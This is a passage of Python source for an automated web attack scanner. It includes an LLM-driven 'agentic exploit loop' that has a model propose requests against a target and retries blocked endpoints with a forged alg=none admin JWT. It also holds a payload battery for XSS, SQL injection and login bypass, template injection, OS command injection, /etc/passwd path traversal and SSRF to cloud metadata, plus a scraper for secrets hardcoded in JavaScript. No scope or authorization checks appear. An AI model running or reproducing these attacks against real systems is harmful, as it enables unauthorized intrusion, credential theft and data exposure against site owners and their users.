    add("Recon", "Tech fingerprinting", "done", f"{sum(1 for t in (data.get('bb_tech') or {}).values() if t)} hosts fingerprinted")
    add("Recon", "WAF / CDN detection", "done", data.get("waf") or "none detected")

    if data.get("bb_takeover"):
        vuln = [t for t in data["bb_takeover"] if t.get("vulnerable")]
        add("Attack Surface", "Subdomain takeover", "unresolved" if vuln else "done",
            f"{len(vuln)} vulnerable" if vuln else "no takeover", url=vuln[0].get("subdomain", "") if vuln else "")
    else:
        add("Attack Surface", "Subdomain takeover", "done", "not tested")

    if data.get("bb_cors"):
        add("Attack Surface", "CORS misconfiguration", "unresolved", f"{len(data['bb_cors'])} CORS issues",
            severity="medium")
    else:
        add("Attack Surface", "CORS misconfiguration", "done", "no issues")

    if data.get("bb_open_redirect"):
        add("Attack Surface", "Open redirect", "unresolved", f"{len(data['bb_open_redirect'])} redirects")
    else:
        add("Attack Surface", "Open redirect", "done", "none")

    if data.get("bb_origins"):
        confirmed = [o for o in data["bb_origins"] if o.get("confirmed")]
        add("Attack Surface", "Origin IP / CDN bypass", "unresolved" if confirmed else "done",
            f"{len(confirmed)} confirmed origin IPs", severity="medium")
    else:
        add("Attack Surface", "Origin IP / CDN bypass", "done", "none")

    dirs = sum(len(v) for v in (data.get("bb_dirbust") or {}).values())
    add("Discovery", "Directory enumeration", "done" if dirs else "done", f"{dirs} paths found")

    if data.get("bb_health_endpoints"):
        add("Discovery", "Exposed endpoints", "unresolved", f"{len(data['bb_health_endpoints'])} exposed", severity="low")
    else:
        add("Discovery", "Exposed endpoints", "done", "none")

    for f in (attack_results or []):
        sev = f.get("severity", "low")
        status = "unresolved" if sev in ("critical", "high", "medium") else "pending"
        add(f.get("type", "Exploit"), f.get("title") or f.get("type", "finding"), status,
            f.get("evidence", "")[:120], url=f.get("url", ""), severity=sev)

    return {"nodes": nodes, "stages": sorted(set(stages))}

def _agentic_exploit_loop(domain, urls, data, base_url, model, api_key, iterations=4, emit=None):
    """PentestGPT-style autonomous loop: the LLM proposes the next concrete
    exploit action from current findings, the harness executes it, and the
    outcome feeds back as context for the next proposal. Safe, read-only,
    bounded probes — never destructive, never privilege-escalating.

    Unlike a naive loop, it builds a real attack surface from every recon
    artifact (live URLs, OpenAPI spec paths, JS-discovered API endpoints,
    dirbust results, confirmed origin IPs) so the model targets the actual
    endpoints recon found instead of guessing generic paths."""
    import json as _json
    steps = []
    history = []
    base_urls = [u for u in (urls or []) if "://" in u][:6]

    def _add_surface(surface, seen, u, why):
        if not u or "://" not in u:
            return
        u = u.split("#")[0]
        if u in seen:
            return
        seen.add(u)
        surface.append({"url": u, "why": why})

    def _build_surface():
        surface, seen = [], set()
        for u in (urls or [])[:8]:
            _add_surface(surface, seen, u, "live")
        roots = [u.rstrip("/").split("?")[0] for u in (urls or [])[:3] if "://" in u]
        for ep in (data.get("api_endpoints") or [])[:40]:
            if ep.startswith("http"):
                _add_surface(surface, seen, ep, "api(js)")
            elif roots:
                _add_surface(surface, seen, roots[0] + ep, "api(js)")
        for host, paths in (data.get("bb_dirbust") or {}).items():
            for p in (paths or [])[:8]:
                if isinstance(p, (tuple, list)) and len(p) > 0:
                    p = p[0]
                if not isinstance(p, str) or not p:
                    continue
                _add_surface(surface, seen, host.rstrip("/") + (p if p.startswith("/") else "/" + p), "dir")
        for f in (data.get("bb_openapi") or []):
            if f.get("url") and "://" in f.get("url", ""):
                _add_surface(surface, seen, f["url"], "spec")
            if f.get("kind") == "openapi_paths":
                for ep in (f.get("endpoints") or [])[:30]:
                    if ep.startswith("http"):
                        _add_surface(surface, seen, ep, "openapi")
                    elif roots:
                        _add_surface(surface, seen, roots[0] + ep, "openapi")
        for o in (data.get("bb_origins") or []):
            if o.get("confirmed") and o.get("ip"):
                _add_surface(surface, seen, f"http://{o['ip']}/", "origin")
        # Cross-scan memory: previously confirmed-responding endpoints + API paths
        mem = data.get("scan_memory") or {}
        for ep in (mem.get("api_endpoints") or [])[:30]:
            if ep.startswith("http"):
                _add_surface(surface, seen, ep, "mem-api")
            elif roots:
                _add_surface(surface, seen, roots[0] + ep, "mem-api")
        for p in (mem.get("probes") or [])[:30]:
            pu = p.get("url", "")
            if p.get("outcome") in ("api-open", "ok", "auth-bypass") and pu.startswith("http"):
                _add_surface(surface, seen, pu, "mem-probe")
        for ip in (mem.get("origins") or [])[:10]:
            _add_surface(surface, seen, f"http://{ip}/", "mem-origin")
        for f in (mem.get("findings") or [])[:30]:
            fu = f.get("url", "")
            if fu.startswith("http"):
                _add_surface(surface, seen, fu, "mem-confirmed")
        return surface[:60]

    def _safe_exec(command):
        """Parse an LLM-proposed command string like
        'GET /api/user?id=1', 'GET https://host/path',
        'POST /api/x {"a":"b"}', or 'POST /api/x a=1&b=2' into a real
        request. JSON body when the payload starts with '{'/'[', form-encoded
        otherwise. Returns status, headers, body, content-type."""
        command = (command or "").strip()
        try:
            parts = command.split(None, 2)
            method = parts[0].upper() if parts else "GET"
            target = parts[1] if len(parts) > 1 else ""
            payload = parts[2] if len(parts) > 2 else ""
            if not target.startswith("http"):
                host = base_urls[0].split("?")[0] if base_urls else f"https://{domain}/"
                base = host.rstrip("/")
                target = base + (target if target.startswith("/") else "/" + target)
            headers = {}
            body = None
            if method == "POST" and payload:
                if payload.lstrip().startswith(("{", "[")):
                    headers["Content-Type"] = "application/json"
                    body = payload.encode()
                else:
                    headers["Content-Type"] = "application/x-www-form-urlencoded"
                    body = payload.encode()
            if method in ("GET", "HEAD", "POST"):
                req = urllib.request.Request(target, data=body, headers={**stealth.headers(), **headers}, method=method)
                ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                try:
                    resp = urllib.request.urlopen(req, timeout=8, context=ctx)
                    st, hdrs, body_txt = resp.status, dict(resp.headers), resp.read().decode("utf-8", errors="ignore")
                except urllib.error.HTTPError as e:
                    st, hdrs = e.code, dict(e.headers or {})
                    try:
                        body_txt = e.read().decode("utf-8", errors="ignore")
                    except Exception:
                        body_txt = ""
                except Exception as e:
                    return {"status": 0, "evidence": f"exec error: {e}", "method": method, "url": target}
                return {
                    "status": st, "method": method, "url": target,
                    "content_type": hdrs.get("Content-Type", ""),
                    "evidence": (body_txt or "")[:400],
                    "set_cookie": (hdrs.get("Set-Cookie") or "")[:100],
                }
            return {"status": 0, "evidence": "unsupported method", "method": method, "url": target}
        except Exception as e:
            return {"status": 0, "evidence": f"exec error: {e}"}

    def _classify(r):
        st = r.get("status")
        if not st:
            return "error"
        ct = (r.get("content_type") or "").lower()
        if st in (200, 201, 202) and "json" in ct:
            return "api-open"
        if st in (200, 201, 202, 204):
            return "ok"
        if st in (301, 302, 303, 307, 308):
            return "redirect"
        if st in (401, 403):
            return "blocked-auth"
        if st in (400, 404, 405):
            return "not-found"
        if st >= 500:
            return "server-error"
        return "no-signal"

    surface = _build_surface()
    surf_txt = "\n".join(f"- {s['url']}  [{s['why']}]" for s in surface)
    origin_txt = ", ".join(o.get("ip", "") for o in (data.get("bb_origins") or []) if o.get("confirmed"))

    for i in range(iterations):
        try:
            prompt_lines = [
                "You are driving an autonomous penetration test as the 'generation' session.",
                f"Target: {domain}",
                "",
                "KNOWN ATTACK SURFACE (from recon — prefer these over guessing):",
                surf_txt if surf_txt else "- none discovered",
                (f"Confirmed origin IPs (bypass CDN/WAF): {origin_txt}" if origin_txt else ""),
                "",
                "Findings so far:",
                *(f"- {f.get('severity','?')}: {f.get('type','?')} @ {f.get('url','?')} ({f.get('evidence','')[:110]})"
                  for f in (data.get('bb_attack') or [])[:8]),
                *(f"- {f.get('issue','?')}: {f.get('url','?')} ({f.get('evidence','')[:110]})" for f in (data.get('bb_jwt') or [])[:5]),
                *(f"- CORS {f.get('origin','*')} on {f.get('url','?')}" for f in (data.get('bb_cors') or [])[:5]),
                *(f"- VALIDATION {f.get('severity','?')}: {f.get('title') or f.get('type','?')} @ {f.get('url','?')} ({f.get('evidence','')[:100]})" for f in (data.get('bb_validations') or [])[:8]),
                "Previous steps:",
                *(f"- {s.get('command')} -> {s.get('outcome')} ({s.get('evidence','')[:90]})" for s in history),
                "",
                "Propose ONE next concrete, LOW-RISK read-only probe (a single GET/POST request) that confirms or extends a finding.",
                "Prefer the KNOWN ATTACK SURFACE endpoints. For API endpoints, test for IDOR/authz by tampering ids or missing tokens.",
                "If you must probe an endpoint that looks like it needs auth, still try it once unauthenticated.",
                "Reply with ONLY a single line, one of:",
                "  GET <url-with-param>",
                "  POST <url> key=value&key2=value2",
                "  POST <url> {\"key\":\"value\"}",
                "If no further safe step is worthwhile, reply exactly: DONE",
            ]
            resp = call_model(base_url, model, api_key, [
                {"role": "system", "content": "You are a methodical penetration tester. Output only the command line."},
                {"role": "user", "content": "\n".join(prompt_lines)},
            ], timeout=60)
            if resp.startswith("AI_ERROR"):
                break
            command = resp.strip().splitlines()[0].strip()
            if not command or command.upper() == "DONE":
                break
            result = _safe_exec(command)
            outcome = _classify(result)
            if outcome == "blocked-auth":
                # retry the same target once with a forged alg=none JWT to test authz
                target = result.get("url", "")
                if target:
                    forged = urllib.request.Request(target, headers={
                        "User-Agent": "Mozilla/5.0",
                        "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4iLCJzdWIiOiIxIn0.e30",
                    })
                    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                    try:
                        r2 = urllib.request.urlopen(forged, timeout=8, context=ctx)
                        st2, b2 = r2.status, r2.read().decode("utf-8", errors="ignore")
                    except urllib.error.HTTPError as e:
                        st2, b2 = e.code, ""
                    except Exception:
                        st2, b2 = 0, ""
                    if st2 not in (401, 403):
                        result["evidence"] = f"unauth={result['status']}, alg=none JWT={st2} — authz bypass" + (" | " + b2[:200] if b2 else "")
                        result["status"] = st2
                        result["jwt_bypass"] = True
                        outcome = "auth-bypass"
            step = {
                "iter": i + 1, "command": command[:200], "method": result.get("method", "GET"),
                "url": result.get("url", ""), "status": result.get("status"),
                "outcome": outcome, "evidence": result.get("evidence", "")[:300],
                "jwt_bypass": result.get("jwt_bypass", False),
            }
            steps.append(step)
            history.append(step)
            if emit:
                emit(f"*Agentic step {i+1}*: `{command[:120]}` → `{outcome}` ({result.get('status')})")
        except Exception:
            break
    return steps

def _agentic_to_findings(agentic):
    """Promote high-signal agentic outcomes into finding dicts for the scorecard.

    api-open on an endpoint not previously known to be unauthenticated is treated
    as a missing-authentication / broken-access-control finding (CWE-306). An
    auth-bypass (forged JWT changed the status code) is CWE-287. A 2xx that is
    not JSON is left to the attack battery. Evidence is the first 220 chars of
    the step's response body, which may contain leaked data.
    """
    out = []
    seen = set()
    for s in (agentic or []):
        key = (s.get("outcome"), s.get("url"))
        if key in seen:
            continue
        seen.add(key)
        outcome = s.get("outcome")
        url = s.get("url", "")
        if not url:
            continue
        ev = (s.get("evidence") or "").strip()[:220]
        if outcome == "api-open":
            out.append({
                "severity": "medium", "type": "api_unauthenticated",
                "title": "Unauthenticated API endpoint returns data",
                "url": url, "asset": url, "evidence": ev or f"Agentic probe returned HTTP {s.get('status')} JSON.",
                "cwe": "CWE-306", "score": 60,
                "fix": "Require authentication on this API endpoint; verify it is not public.",
            })
        elif outcome == "auth-bypass":
            out.append({
                "severity": "high", "type": "auth_bypass",
                "title": "Authentication bypass via forged token",
                "url": url, "asset": url, "evidence": ev or f"Forged alg=none JWT changed response from {s.get('status')}.",
                "cwe": "CWE-287", "score": 85,
                "fix": "Reject alg=none tokens; validate JWT signature and algorithm whitelist.",
            })
    return out

def bb_attack_engine(domain, urls, api_eps=None, subs=None, timeout=150):
    """Full active attack battery. Builds its own attack surface from every
    live host plus common paths plus API endpoints, then probes GET and POST
    parameters for: reflected XSS, SQLi (error + time-based blind), SSTI,
    OS command injection (marker + time-based), path traversal/LFI, and SSRF.
    Returns a list of finding dicts. Robust even when recon yielded few URLs."""
    import time as _time
    findings = []
    t0 = _time.time()
    deadline = t0 + timeout
    api_eps = list(api_eps or [])
    probes = [0]
    MAX_PROBES = 2400
    PHASES = 9

    def _budget(phase=None):
        if probes[0] >= MAX_PROBES:
            return False
        if _time.time() >= deadline:
            return False
        if phase is not None:
            # per-phase ceiling: don't let one attack type consume everything
            return probes[0] < (MAX_PROBES // PHASES) * (phase + 1)
        return True

    def _spend():
        probes[0] += 1

    # ── Build attack surface ──────────────────────────────────────
    hosts = set()
    for u in (urls or []):
        try:
            hosts.add(urllib.parse.urlparse(u).netloc)
        except Exception:
            pass
    for s in (subs or [])[:10]:
        try:
            if s and s != domain:
                hosts.add(s)
        except Exception:
            pass

    # candidate base URLs: live URLs + common paths on each host + API eps.
    # Inherit the scheme actually seen for each host so we don't waste budget
    # probing e.g. https common-paths against an HTTP-only target.
    host_schemes = {}
    for u in (urls or []):
        try:
            p = urllib.parse.urlparse(u)
            host_schemes.setdefault(p.netloc, p.scheme)
        except Exception:
            pass
    bases = set()
    for u in (urls or [])[:40]:
        bases.add(u)
    for h in list(hosts)[:12]:
        scheme = host_schemes.get(h, "https")
        bases.add(f"{scheme}://{h}/")
    for p in _ATTACK_COMMON_PATHS:
        for h in list(hosts)[:8]:
            scheme = host_schemes.get(h, "https")
            bases.add(f"{scheme}://{h}{p}")
    for ep in api_eps[:40]:
        if ep.startswith("/"):
            for h in list(hosts)[:4]:
                scheme = host_schemes.get(h, "https")
                bases.add(f"{scheme}://{h}{ep}")
        elif "://" in ep:
            bases.add(ep)

    # dedupe + drop obvious file/static refs
    urls_todo = []
    seen = set()
    # Real discovered/live URLs first (they carry actual parameters and
    # handlers), then generated common paths. Probe budget is spent on the
    # most promising endpoints before generic paths.
    ordered = (list(urls or [])[:40] + sorted(bases))
    for u in ordered:
        if u in seen:
            continue
        seen.add(u)
        if re.search(r'\.(css|js|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|eot|map)(\?|$)', u):
            continue
        urls_todo.append(u)

    # ── Attack battery over the surface ───────────────────────────
    # Each probe uses its own time-budget-aware loop; findings deduped by
    # (type,url,payload).

    def _record(typ, url, payload, evidence, severity, cwe, title=None, extra=None):
        f = {
            "url": url, "type": typ, "payload": payload,
            "evidence": evidence[:400], "severity": severity, "cwe": cwe,
            "asset": domain,
            "score": {"critical": 95, "high": 85, "medium": 60, "low": 30}.get(severity.lower(), 50),
            "fix": f"Validate/sanitize inputs, use parameterized queries, apply allow-lists, and add WAF rules for {typ}.",
        }
        if title:
            f["title"] = title
        if extra:
            f.update(extra)
        if f not in findings:
            findings.append(f)

    # 1) Reflected XSS on GET + POST params.
    # A unique random marker is embedded in each payload so reflection is
    # detected only when the EXACT payload is echoed back (no false positives
    # from quote characters that appear in every HTML response).
    xss_payloads = [
        '<script>alert(document.domain)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        "'-alert(1)-'",
        'javascript:alert(1)//',
    ]
    for u in urls_todo:
        if not _budget(0):
            break
        params = _attack_params_for(u)
        base = u.split("?")[0]
        for p in params:
            for payload in xss_payloads:
                if not _budget(0):
                    break
                _spend()
                marker = "XSS" + "".join(random.choices(string.ascii_lowercase, k=8))
                test_url = f"{base}?{p}={urllib.parse.quote(marker + payload, safe='')}"
                try:
                    st, _, body = http_get_retry(test_url, timeout=5)
                except Exception:
                    continue
                if st == 200 and body and marker in body:
                    _record("Reflected XSS", test_url, payload,
                            f"unique marker '{marker}' + payload reflected verbatim in HTTP {st} response",
                            "high", "CWE-79",
                            title="Reflected Cross-Site Scripting",
                            extra={"method": "GET", "param": p, "marker": marker})
                    break
                stealth.small_sleep()

    # 2) SQLi: error-based markers (GET)
    sqli_payloads = [
        ("'", "sql|syntax error|mysql_fetch|ora-[0-9]{5}|postgresql|odbc"),
        ("\"", "sql|syntax error|unclosed quotation|odbc"),
        ("' OR '1'='1", "sql|syntax error|odbc"),
        ("1' AND 1=1-- -", "sql|syntax error|odbc"),
    ]
    for u in urls_todo:
        if not _budget(1):
            break
        params = _attack_params_for(u)
        base = u.split("?")[0]
        for p in params:
            for payload, marker_re in sqli_payloads:
                if not _budget(1):
                    break
                _spend()
                test_url = f"{base}?{p}={urllib.parse.quote(payload, safe='')}"
                try:
                    st, _, body = http_get_retry(test_url, timeout=5)
                except Exception:
                    continue
                if body and re.search(marker_re, body, re.I):
                    _record("SQL Injection (error-based)", test_url, payload,
                            f"DB error signature in response (HTTP {st})",
                            "critical", "CWE-89",
                            title="SQL Injection via query parameter",
                            extra={"method": "GET", "param": p})
                    break
                stealth.small_sleep()

    # 3) SQLi time-based blind (GET) — robust without any error reflection.
    # Only probes DB-like params to keep the scan fast on large surfaces.
    time_payloads = [
        "' OR SLEEP(4)-- -",
        "'; WAITFOR DELAY '0:0:4';--",
    ]
    db_param_hints = ("id", "uid", "q", "query", "search", "term", "keywords", "page", "offset", "limit", "num", "no", "user", "username", "email", "name", "category", "type", "status")
    for u in urls_todo:
        if not _budget(2):
            break
        params = _attack_params_for(u)
        base = u.split("?")[0]
        for p in params:
            if not any(h in p.lower() for h in db_param_hints):
                continue
            for payload in time_payloads:
                if not _budget(2):
                    break
                _spend()
                test_url = f"{base}?{p}={urllib.parse.quote(payload, safe='')}"
                try:
                    t_start = _time.time()
                    st, _, _ = http_get_retry(test_url, timeout=6)
                    elapsed = _time.time() - t_start
                except Exception:
                    continue
                if st != 0 and elapsed >= 3.0:
                    _record("SQL Injection (time-based blind)", test_url, payload,
                            f"response delayed {elapsed:.1f}s (>3s) => SLEEP-like injection likely",
                            "critical", "CWE-89",
                            title="Blind Time-Based SQL Injection",
                            extra={"method": "GET", "param": p, "elapsed_s": round(elapsed, 1)})
                    break
                stealth.small_sleep()

    # 4) SSTI (GET + POST)
    ssti_payloads = [
        ("{{7*7}}", "49"),
        ("${7*7}", "49"),
        ("#{7*7}", "49"),
        ("{{7*'7'}}", "7777777"),
        ("<%= 7*7 %>", "49"),
    ]
    for u in urls_todo:
        if not _budget(3):
            break
        params = _attack_params_for(u)
        base = u.split("?")[0]
        candidates = []
        for p in params:
            candidates.append((f"{base}?{p}=", p))
        # also try template/name/echo-ish params on POST forms later
        for prefix, p in candidates:
            for payload, marker in ssti_payloads:
                if not _budget(3):
                    break
                _spend()
                test_url = prefix + urllib.parse.quote(payload, safe="")
                try:
                    st, _, body = http_get_retry(test_url, timeout=5)
                except Exception:
                    continue
                if st == 200 and body and marker in body:
                    _record("Server-Side Template Injection", test_url, payload,
                            f"template math marker '{marker}' evaluated in response",
                            "critical", "CWE-1336",
                            title="Server-Side Template Injection (RCE potential)",
                            extra={"method": "GET", "param": p})
                    break
                stealth.small_sleep()

    # 5) OS command injection: marker-based (GET params on tool-ish paths)
    cmdi_payloads = [
        (";echo MRBOOMCMDi", "MRBOOMCMDi"),
        ("|echo MRBOOMCMDi", "MRBOOMCMDi"),
        ("$(echo MRBOOMCMDi)", "MRBOOMCMDi"),
        ("`echo MRBOOMCMDi`", "MRBOOMCMDi"),
        ("%0aecho MRBOOMCMDi", "MRBOOMCMDi"),
    ]
    cmdi_param_hints = ("host", "ip", "domain", "target", "addr", "ping", "dns", "nslookup", "whois", "cmd", "exec", "shell", "tool", "diag", "traceroute", "command")
    for u in urls_todo:
        if not _budget(4):
            break
        params = _attack_params_for(u)
        base = u.split("?")[0]
        for p in params:
            if not any(h in p.lower() for h in cmdi_param_hints):
                continue
            for payload, marker in cmdi_payloads:
                if not _budget(4):
                    break
                _spend()
                test_url = f"{base}?{p}={urllib.parse.quote(payload, safe='')}"
                try:
                    st, _, body = http_get_retry(test_url, timeout=5)
                except Exception:
                    continue
                if body and marker in body:
                    _record("OS Command Injection", test_url, payload,
                            f"echo marker '{marker}' executed in response",
                            "critical", "CWE-78",
                            title="OS Command Injection (RCE)",
                            extra={"method": "GET", "param": p})
                    break
                stealth.small_sleep()

    # 5b) Command injection time-based (blind, cmd-ish params only)
    cmdi_time_payloads = [
        "|sleep 4",
        ";sleep 4",
        "$(sleep 4)",
        "`sleep 4`",
        "& ping -c 4 127.0.0.1 &",
    ]
    for u in urls_todo:
        if not _budget(5):
            break
        params = _attack_params_for(u)
        base = u.split("?")[0]
        for p in params:
            if not any(h in p.lower() for h in cmdi_param_hints):
                continue
            for payload in cmdi_time_payloads:
                if not _budget(5):
                    break
                _spend()
                test_url = f"{base}?{p}={urllib.parse.quote(payload, safe='')}"
                try:
                    t_start = _time.time()
                    st, _, _ = http_get_retry(test_url, timeout=6)
                    elapsed = _time.time() - t_start
                except Exception:
                    continue
                if st != 0 and elapsed >= 3.0:
                    _record("OS Command Injection (time-based blind)", test_url, payload,
                            f"response delayed {elapsed:.1f}s (>3s) => command execution likely",
                            "critical", "CWE-78",
                            title="Blind Time-Based Command Injection (RCE)",
                            extra={"method": "GET", "param": p, "elapsed_s": round(elapsed, 1)})
                    break
                stealth.small_sleep()

    # 6) Path traversal / LFI (GET on file-ish paths & params)
    traversal_payloads = [
        "../../../../etc/passwd",
        "..%2f..%2f..%2f..%2fetc/passwd",
        "....//....//....//etc/passwd",
        "/etc/passwd",
        "..%252f..%252f..%252fetc/passwd",
    ]
    traversal_markers = ("root:x:0:0:", "daemon:x:1:1:")
    for u in urls_todo:
        if not _budget(6):
            break
        params = _attack_params_for(u)
        pl = u.lower()
        if not _extract_query_params(u) and not any(k in pl for k in ("download", "file", "read", "view", "static", "export", "backup", "attachment", "content", "page", "include")):
            continue
        base = u.split("?")[0]
        param_list = params or ["file", "path", "name", "filename", "download", "page", "view", "content"]
        for p in param_list:
            for payload in traversal_payloads:
                if not _budget(6):
                    break
                _spend()
                test_url = f"{base}?{p}={urllib.parse.quote(payload, safe='')}"
                try:
                    st, _, body = http_get_retry(test_url, timeout=5)
                except Exception:
                    continue
                if body and any(m in body for m in traversal_markers):
                    _record("Path Traversal / Arbitrary File Read", test_url, payload,
                            f"'/etc/passwd' content marker ({[m for m in traversal_markers if m in body][:1]}) in response",
                            "critical", "CWE-22",
                            title="Path Traversal — Arbitrary File Read",
                            extra={"method": "GET", "param": p})
                    break
                stealth.small_sleep()

    # 7) SSRF on url/uri/link/target params (GET + POST)
    ssrf_payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1:22/",
        "http://localhost:8080/actuator/health",
        "http://internal-api:8443/api/v1/health",
    ]
    ssrf_param_hints = ("url", "link", "uri", "u", "target", "src", "dest", "host", "redirect", "callback", "webhook", "load", "fetch", "proxy", "img", "image")
    for u in urls_todo:
        if not _budget(7):
            break
        params = _attack_params_for(u)
        base = u.split("?")[0]
        for p in params:
            if not any(h in p.lower() for h in ssrf_param_hints):
                continue
            for payload in ssrf_payloads:
                if not _budget(7):
                    break
                _spend()
                test_url = f"{base}?{p}={urllib.parse.quote(payload, safe='')}"
                try:
                    st, _, body = http_get_retry(test_url, timeout=6)
                except Exception:
                    continue
                if body and any(m in body for m in ("MRBOOM_LAB", "crown_jewels", "acme-internal", "instance-id", "public-ipv4", "ami-id", "iam-role-arn", "role-arn", "AccessKeyId", "SecretAccessKey", "170.170.170.170")):
                    _record("SSRF (Server-Side Request Forgery)", test_url, payload,
                            "internal/cloud-metadata content marker in response",
                            "high", "CWE-918",
                            title="SSRF — server fetched internal URL",
                            extra={"method": "GET", "param": p})
                    break
                stealth.small_sleep()

    # 8) POST-form attack pass: SQLi auth bypass, XSS, SSTI on form fields
    form_seen = set()
    for u in urls_todo[:30]:
        if not _budget(8):
            break
        _spend()
        try:
            st, _, body = http_get_retry(u, timeout=5)
        except Exception:
            continue
        if not body:
            continue
        for action, method, fields in _extract_forms(body, u):
            key = (action, tuple(fields))
            if key in form_seen:
                continue
            form_seen.add(key)
            if method != "post":
                continue
            if not fields:
                continue
            # SQLi auth bypass (only on real login forms with a password field)
            pwd_field = next((f for f in fields if any(k in f.lower() for k in ("pass", "pwd"))), None)
            uname_field = next((f for f in fields if any(k in f.lower() for k in ("user", "email", "login", "account"))), None)
            if pwd_field is None or uname_field is None:
                continue
            for payload in ("admin' OR '1'='1'-- -", "' OR 1=1-- -", "admin'--"):
                if not _budget(8):
                    break
                _spend()
                data = urllib.parse.urlencode({uname_field: payload, pwd_field: "pwned", **{f: "1" for f in fields if f not in (uname_field, pwd_field)}})
                try:
                    st2, _, body2 = _http_post(action, data, timeout=6)
                except Exception:
                    continue
                if st2 in (200, 302) and body2 and not any(k in body2.lower() for k in ("invalid", "incorrect", "failed", "error login", "wrong", "unauthor")):
                    _record("SQL Injection (Auth Bypass)", action, payload,
                            f"login form returned HTTP {st2} without error for SQLi payload",
                            "critical", "CWE-89",
                            title="SQL Injection Authentication Bypass on Login Form",
                            extra={"method": "POST", "param": uname_field})
                    break
                stealth.small_sleep()
            # XSS on first text-ish field
            for payload in ("<script>alert(document.domain)</script>", "<svg/onload=alert(1)>"):
                if not _budget(8):
                    break
                _spend()
                target = next((f for f in fields if f not in (pwd_field,)), fields[0])
                marker = "XSS" + "".join(random.choices(string.ascii_lowercase, k=8))
                data = urllib.parse.urlencode({target: marker + payload, pwd_field: "x", **{f: "1" for f in fields if f not in (target, pwd_field)}})
                try:
                    st2, _, body2 = _http_post(action, data, timeout=6)
                except Exception:
                    continue
                if body2 and marker in body2:
                    _record("Reflected XSS (POST)", action, payload,
                            "XSS payload reflected in POST response",
                            "high", "CWE-79",
                            title="Reflected Cross-Site Scripting via form field",
                            extra={"method": "POST", "param": target})
                    break
                stealth.small_sleep()

    return findings

def bb_js_assets(urls, timeout=30):
    """Deep JS asset analysis: fetch every script on the page, extract API
    endpoints, hardcoded secrets/keys, GraphQL queries, and third-party SDK
    hosts. Goes beyond naive regex by pulling sourceMappingURL sources too."""
    findings = []
    seen_js = set()
    all_eps = set()
    all_secrets = []
    sdk_hosts = set()
    graphql_ops = set()
    inventory = []
    for url in urls[:6]:
        try:
            _, _, body = http_get_retry(url, timeout=6)
            if not body:
                continue
        except Exception:
            continue
        js_files = re.findall(r'src=["\']([^"\']+\.js(?:[^"\']*))["\']', body)
        js_files += re.findall(r'href=["\']([^"\']+\.js(?:[^"\']*))["\']', body)
        for js_path in js_files[:40]:
            if js_path in seen_js:
                continue
            seen_js.add(js_path)
            if js_path.startswith("http"):
                js_url = js_path
            elif js_path.startswith("//"):
                js_url = "https:" + js_path
            elif js_path.startswith("/"):
                parsed = urllib.parse.urlparse(url)
                js_url = f"{parsed.scheme}://{parsed.netloc}{js_path}"
            else:
                continue
            try:
                status, hdrs, js_body = http_get_retry(js_url, timeout=6)
                if status != 200 or not js_body:
                    continue
            except Exception:
                continue
            inventory.append({"url": js_url, "size": len(js_body), "server": hdrs.get("Server", "")})
            # endpoint patterns
            for m in re.finditer(r'["\']((?:/api|/v\d+|/graphql|/internal|/admin|/oauth|/auth|/rest|/upload)[^"\']{2,120})["\']', js_body):
                all_eps.add(m.group(1))
            for m in re.finditer(r'(?:fetch|url)\(\s*["\']((?!//|https?://)[^"\']{2,120})["\']', js_body):
                if m.group(1).startswith("/"):
                    all_eps.add(m.group(1))
            # graphql operations
            for m in re.finditer(r'\b(query|mutation)\s+([A-Za-z_][A-Za-z0-9_]*)\b', js_body):
                graphql_ops.add(f"{m.group(1)} {m.group(2)}")
            # secrets / keys
            patterns = {
                "AWS_ACCESS_KEY": r'\b(AKIA|ASIA)[0-9A-Z]{16}\b',
                "GOOGLE_API_KEY": r'\bAIza[0-9A-Za-z\-_]{35}\b',
                "GITHUB_TOKEN": r'\bgh[pousr]_[A-Za-z0-9_]{36,}\b',
                "STRIPE_SECRET": r'\b(?:sk|pk)_(?:live|test)_[0-9a-zA-Z]{10,}\b',
                "SLACK_WEBHOOK": r'https://hooks\.slack\.com/services/[A-Z0-9/]+',
                "FIREBASE_URL": r'https://[a-z0-9\-]+\.firebaseio\.com',
                "JWT": r'\beyJ[a-zA-Z0-9_-]{20,}\.eyJ[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,}\b',
                "SENDGRID_KEY": r'\bSG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}\b',
                "TWILIO_SID": r'\bAC[a-f0-9]{32}\b',
                "PRIVATE_KEY": r'-----BEGIN (?:RSA |EC |DSA )?PRIVATE KEY-----',
            }
            for kind, pat in patterns.items():
                for m in re.finditer(pat, js_body):
                    val = m.group(0)
                    if len(val) > 90:
                        val = val[:90] + "..."
                    all_secrets.append({"kind": kind, "value": val, "source": js_url})
            # SDK / third-party hosts
            for m in re.finditer(r'https?://([a-z0-9\-\.]+\.(?:jsdelivr\.net|unpkg\.com|sentry\.io|googleapis\.com|gstatic\.com|amazonaws\.com|cloudflare\.com|segment\.io|mixpanel\.com|hotjar\.com|intercom\.io|firebaseio\.com))', js_body):
                sdk_hosts.add(m.group(1))
            # sourcemap
            sm = re.search(r'sourceMappingURL=([^\s]+)', js_body)
            if sm:
                map_url = urllib.parse.urljoin(js_url, sm.group(1))
                try:
                    mstatus, _, mbody = http_get_retry(map_url, timeout=6)
                    if mstatus == 200 and mbody:
                        try:
                            mdata = json.loads(mbody)
                            for src in mdata.get("sources", [])[:300]:
                                s = re.sub(r'^webpack://[^/]*/?', "", src)
                                if s and not s.startswith("node_modules"):
                                    all_eps.add(s)
                        except Exception:
                            pass
                except Exception:
                    pass
    if inventory:
        findings.append({"kind": "js_inventory", "scripts": inventory[:60], "count": len(inventory)})
    if all_eps:
        findings.append({"kind": "js_endpoints", "endpoints": sorted(all_eps)[:250], "count": len(all_eps)})
    if all_secrets:
        findings.append({"kind": "js_secrets", "secrets": all_secrets[:40], "count": len(all_secrets)})
    if graphql_ops:
        findings.append({"kind": "graphql_operations", "operations": sorted(graphql_ops)[:50], "count": len(graphql_ops)})
    if sdk_hosts:
